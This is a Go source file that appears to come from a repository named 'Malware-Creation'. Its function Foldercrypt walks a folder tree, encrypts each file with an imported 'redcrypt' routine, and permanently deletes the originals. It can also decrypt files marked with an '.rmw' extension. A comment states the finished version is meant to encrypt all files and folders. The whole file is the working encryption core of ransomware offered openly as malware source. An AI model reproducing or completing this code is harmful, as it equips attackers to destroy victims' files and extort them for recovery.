package foldercrypt

import (
	"errors"
	"fmt"
	"io/fs"
	"os"
	"regexp"
	"strings"

	"github.com/Redhead92/Malware-Creation/tree/main/redware/Block1_Crypt/redcrypt"
)

func check(e error) error {
	if e != nil {
		if e == fs.ErrPermission {
			return fs.SkipDir
		}

		fmt.Println(e)
		panic(e)
	}
	return nil
}

func Foldercrypt(mode string, iFolder string, key string) {
	// WIP final code, encrypt all files and folders.

	// test code, encrypt only indicated folders

	switch mode {
	// Decryption
	case "D":
		// Folder vars
		var temppath string
		folder := os.DirFS(iFolder)
		// walking system functions
		fs.WalkDir(folder, ".", func(path string, info fs.DirEntry, err error) error {
			if errors.Is(err, fs.ErrPermission) || errors.Is(err, fs.ErrNotExist) {
				return fs.SkipDir
			}
			temppath = iFolder + path
			fmt.Printf("current path: %v\n", temppath)
			fileinfo, err := os.Stat(temppath)
			check(err)

			// skip dirs, files without extension and unencrypted files
			if fileinfo.IsDir() || !strings.Contains(temppath, ".rmw") {

			} else {
				//Decrypt file into plaintext
				redcrypt.Reddecrypt(temppath, key)
				// Delete files permanently
				os.Remove(temppath)
				check(err)
			}
			return nil
		})

	case "E":
		// Folder vars
		var temppath string
		folder := os.DirFS(iFolder)
		// walking system functions
		fs.WalkDir(folder, ".", func(path string, info fs.DirEntry, err error) error {
			// Deal with permission errors
			if err == fs.ErrPermission || errors.Is(err, fs.ErrNotExist) {
				return fs.SkipDir
			}
			temppath = iFolder + path
			fileinfo, err := os.Stat(temppath)
			check(err)
			// skip dirs and skip hidden files (for testing)
			if fileinfo.IsDir() || strings.Contains(temppath, "$") {

			} else {
				// Find folder Walk is currently in with path
				td := regexp.MustCompile(`((.*)\/)`)
				tempdir := string(td.FindString(temppath))
				// Read, Encrypt + generate new encrypted file with RedCrypt function
				redcrypt.Redcrypt(tempdir, key, temppath)
				// Delete files permanently
				os.Remove(temppath)
				check(err)
			}
			return nil
		})

	}
}
